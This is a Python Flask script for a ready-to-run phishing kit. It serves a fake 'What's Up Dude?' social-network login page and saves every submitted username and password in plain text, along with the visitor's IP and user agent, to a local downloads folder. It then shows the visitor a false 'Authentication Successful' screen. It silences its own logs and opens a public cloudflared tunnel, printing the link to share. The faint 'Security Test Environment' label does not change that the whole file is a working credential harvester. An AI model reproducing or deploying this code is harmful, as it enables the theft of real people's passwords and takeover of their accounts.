import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

# Auto-install missing packages quietly
def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

# Flask app setup
app = Flask(__name__)
app.secret_key = 'whatsup-dude-test-2024'

# Suppress Flask and Werkzeug logs completely
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

# Also silence Flask's startup messages by redirecting output temporarily
class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

# Data saving folder
BASE_FOLDER = os.path.expanduser("~/storage/downloads/WhatsUp Dude")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['session_id'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>What's Up Dude? - Connect with Friends</title>
        <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
        <style>
            :root {
                --primary-green: #00ff7f;
                --dark-bg: #0a0a0a;
                --card-bg: #1a1a1a;
                --text-light: #ffffff;
                --text-gray: #888888;
                --border-dark: #333333;
            }
            
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Montserrat', sans-serif;
                background: var(--dark-bg);
                color: var(--text-light);
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 20px;
                background-image: 
                    radial-gradient(circle at 20% 80%, rgba(0, 255, 127, 0.1) 0%, transparent 50%),
                    radial-gradient(circle at 80% 20%, rgba(0, 255, 127, 0.05) 0%, transparent 50%);
            }
            
            .container {
                width: 100%;
                max-width: 420px;
            }
            
            .header {
                text-align: center;
                margin-bottom: 40px;
            }
            
            .logo {
                font-size: 3.5rem;
                font-weight: 700;
                background: linear-gradient(135deg, #00ff7f, #00cc66);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin-bottom: 10px;
                text-shadow: 0 0 30px rgba(0, 255, 127, 0.3);
            }
            
            .tagline {
                font-size: 1.1rem;
                color: var(--text-gray);
                font-weight: 300;
                letter-spacing: 0.5px;
            }
            
            .login-card {
                background: var(--card-bg);
                border: 1px solid var(--border-dark);
                border-radius: 16px;
                padding: 40px 35px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
                backdrop-filter: blur(10px);
            }
            
            .welcome-text {
                text-align: center;
                margin-bottom: 30px;
            }
            
            .welcome-text h2 {
                font-size: 1.5rem;
                font-weight: 600;
                margin-bottom: 8px;
                color: var(--text-light);
            }
            
            .welcome-text p {
                color: var(--text-gray);
                font-size: 0.95rem;
                line-height: 1.5;
            }
            
            .input-group {
                margin-bottom: 20px;
            }
            
            .input-label {
                display: block;
                margin-bottom: 8px;
                font-weight: 500;
                color: var(--text-light);
                font-size: 0.9rem;
            }
            
            .input-field {
                width: 100%;
                padding: 16px 18px;
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid var(--border-dark);
                border-radius: 10px;
                color: var(--text-light);
                font-size: 1rem;
                font-family: 'Montserrat', sans-serif;
                transition: all 0.3s ease;
            }
            
            .input-field:focus {
                outline: none;
                border-color: var(--primary-green);
                box-shadow: 0 0 0 3px rgba(0, 255, 127, 0.1);
                background: rgba(255, 255, 255, 0.08);
            }
            
            .input-field::placeholder {
                color: #666;
            }
            
            .login-button {
                width: 100%;
                padding: 16px;
                background: linear-gradient(135deg, #00ff7f, #00cc66);
                border: none;
                border-radius: 10px;
                color: #000;
                font-size: 1rem;
                font-weight: 600;
                font-family: 'Montserrat', sans-serif;
                cursor: pointer;
                transition: all 0.3s ease;
                margin-top: 10px;
                letter-spacing: 0.5px;
            }
            
            .login-button:hover {
                transform: translateY(-2px);
                box-shadow: 0 8px 20px rgba(0, 255, 127, 0.3);
            }
            
            .login-button:active {
                transform: translateY(0);
            }
            
            .divider {
                display: flex;
                align-items: center;
                margin: 30px 0;
                color: var(--text-gray);
                font-size: 0.9rem;
            }
            
            .divider::before,
            .divider::after {
                content: '';
                flex: 1;
                border-bottom: 1px solid var(--border-dark);
            }
            
            .divider::before {
                margin-right: 15px;
            }
            
            .divider::after {
                margin-left: 15px;
            }
            
            .social-login {
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 12px;
                margin-bottom: 25px;
            }
            
            .social-btn {
                padding: 12px;
                border: 1px solid var(--border-dark);
                border-radius: 8px;
                background: rgba(255, 255, 255, 0.05);
                color: var(--text-light);
                font-size: 0.9rem;
                cursor: pointer;
                transition: all 0.3s ease;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
            }
            
            .social-btn:hover {
                background: rgba(255, 255, 255, 0.1);
                border-color: var(--primary-green);
            }
            
            .footer-links {
                text-align: center;
                margin-top: 25px;
            }
            
            .footer-link {
                color: var(--primary-green);
                text-decoration: none;
                font-size: 0.9rem;
                margin: 0 10px;
                transition: color 0.3s ease;
            }
            
            .footer-link:hover {
                color: #00cc66;
                text-decoration: underline;
            }
            
            .signup-text {
                text-align: center;
                margin-top: 25px;
                color: var(--text-gray);
                font-size: 0.9rem;
            }
            
            .signup-link {
                color: var(--primary-green);
                text-decoration: none;
                font-weight: 600;
            }
            
            .signup-link:hover {
                text-decoration: underline;
            }
            
            .feature-highlights {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                gap: 15px;
                margin: 25px 0;
            }
            
            .feature {
                text-align: center;
                padding: 15px 10px;
                background: rgba(255, 255, 255, 0.03);
                border-radius: 8px;
                border: 1px solid var(--border-dark);
            }
            
            .feature-icon {
                font-size: 1.5rem;
                margin-bottom: 8px;
                opacity: 0.8;
            }
            
            .feature-text {
                font-size: 0.8rem;
                color: var(--text-gray);
            }
            
            @media (max-width: 480px) {
                .container {
                    max-width: 100%;
                }
                
                .login-card {
                    padding: 30px 25px;
                }
                
                .logo {
                    font-size: 2.8rem;
                }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div class="logo">What's Up Dude?</div>
                <div class="tagline">Connect, Chat, and Share with Friends</div>
            </div>
            
            <div class="login-card">
                <div class="welcome-text">
                    <h2>Welcome Back!</h2>
                    <p>Sign in to continue your conversations and see what's up with your friends.</p>
                </div>
                
                <form action="/login" method="post">
                    <div class="input-group">
                        <label class="input-label">Username or Email</label>
                        <input type="text" name="username" class="input-field" placeholder="Enter your username or email" required>
                    </div>
                    
                    <div class="input-group">
                        <label class="input-label">Password</label>
                        <input type="password" name="password" class="input-field" placeholder="Enter your password" required>
                    </div>
                    
                    <button type="submit" class="login-button">Sign In to What's Up Dude</button>
                </form>
                
                <div class="divider">or continue with</div>
                
                <div class="social-login">
                    <button type="button" class="social-btn">
                        <span>📘</span> Facebook
                    </button>
                    <button type="button" class="social-btn">
                        <span>📱</span> Google
                    </button>
                </div>
                
                <div class="feature-highlights">
                    <div class="feature">
                        <div class="feature-icon">🔒</div>
                        <div class="feature-text">Secure</div>
                    </div>
                    <div class="feature">
                        <div class="feature-icon">⚡</div>
                        <div class="feature-text">Fast</div>
                    </div>
                    <div class="feature">
                        <div class="feature-icon">🌎</div>
                        <div class="feature-text">Global</div>
                    </div>
                </div>
                
                <div class="footer-links">
                    <a href="#" class="footer-link">Forgot Password?</a>
                    <a href="#" class="footer-link">Help Center</a>
                    <a href="#" class="footer-link">Privacy</a>
                </div>
                
                <div class="signup-text">
                    New to What's Up Dude? <a href="#" class="signup-link">Create an account</a>
                </div>
            </div>
        </div>
        
        <!-- Security Notice -->
        <div style="position: fixed; bottom: 10px; right: 10px; font-size: 8px; color: #333; opacity: 0.3;">
            Security Test Environment
        </div>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('session_id', 'unknown')

    if not username or not password:
        return "Username and password are required!", 400

    safe_username = secure_filename(username)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Session ID: {session_id}\n")
        file.write(f"Username: {username}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Connecting - What's Up Dude?</title>
        <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600&display=swap" rel="stylesheet">
        <style>
            :root {
                --primary-green: #00ff7f;
                --dark-bg: #0a0a0a;
                --card-bg: #1a1a1a;
                --text-light: #ffffff;
            }
            
            body {
                font-family: 'Montserrat', sans-serif;
                background: var(--dark-bg);
                color: var(--text-light);
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                background-image: 
                    radial-gradient(circle at 20% 80%, rgba(0, 255, 127, 0.1) 0%, transparent 50%),
                    radial-gradient(circle at 80% 20%, rgba(0, 255, 127, 0.05) 0%, transparent 50%);
            }
            
            .container {
                text-align: center;
                background: var(--card-bg);
                padding: 50px 40px;
                border-radius: 16px;
                border: 1px solid #333;
                max-width: 500px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            }
            
            .success-icon {
                font-size: 4rem;
                margin-bottom: 20px;
                animation: bounce 2s infinite;
            }
            
            @keyframes bounce {
                0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
                40% {transform: translateY(-10px);}
                60% {transform: translateY(-5px);}
            }
            
            h2 {
                color: var(--primary-green);
                font-weight: 600;
                margin-bottom: 15px;
                font-size: 1.8rem;
            }
            
            .loading-bar {
                width: 100%;
                height: 4px;
                background: #333;
                border-radius: 2px;
                margin: 30px 0;
                overflow: hidden;
            }
            
            .loading-progress {
                height: 100%;
                background: linear-gradient(90deg, #00ff7f, #00cc66);
                border-radius: 2px;
                animation: loading 3s ease-in-out;
            }
            
            @keyframes loading {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            
            .status-message {
                background: rgba(0, 255, 127, 0.1);
                border: 1px solid var(--primary-green);
                border-radius: 10px;
                padding: 20px;
                margin: 25px 0;
            }
            
            .status-message strong {
                color: var(--primary-green);
            }
            
            p {
                color: #ccc;
                line-height: 1.6;
                margin: 10px 0;
            }
            
            .connection-steps {
                display: flex;
                justify-content: space-between;
                margin: 25px 0;
                font-size: 0.9rem;
                color: #666;
            }
            
            .step {
                text-align: center;
                flex: 1;
            }
            
            .step.active {
                color: var(--primary-green);
            }
        </style>
        <meta http-equiv="refresh" content="5;url=/" />
    </head>
    <body>
        <div class="container">
            <div class="success-icon">🚀</div>
            <h2>Welcome to What's Up Dude!</h2>
            
            <div class="status-message">
                <strong>Authentication Successful!</strong><br>
                Your account has been verified and you're now connected.
            </div>
            
            <div class="connection-steps">
                <div class="step active">✓ Signed In</div>
                <div class="step active">✓ Profile Loaded</div>
                <div class="step">Connecting...</div>
            </div>
            
            <div class="loading-bar">
                <div class="loading-progress"></div>
            </div>
            
            <p>Loading your messages and friend connections...</p>
            <p style="font-size: 0.9rem; color: #666;">You will be redirected automatically</p>
        </div>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"What's Up Dude Public Link: {tunnel_url}")
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5000")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        sys.exit(0)